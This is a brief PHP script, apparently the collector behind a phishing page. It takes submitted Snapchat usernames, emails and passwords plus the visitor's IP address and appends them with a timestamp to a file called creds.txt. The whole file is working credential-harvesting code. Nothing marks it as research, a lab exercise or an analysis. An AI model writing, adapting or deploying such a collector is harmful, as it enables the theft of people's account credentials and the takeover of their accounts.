 
<?php
$snap   = $_POST['snap']   ?? '';
$email  = $_POST['email']  ?? '';
$pass   = $_POST['password'] ?? '';
$ip     = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
$time   = date("Y-m-d H:i:s");

$data = "[$time] [$ip] Snap:$snap | Email:$email | Pass:$pass" . PHP_EOL;
file_put_contents('creds.txt', $data, FILE_APPEND);
?>
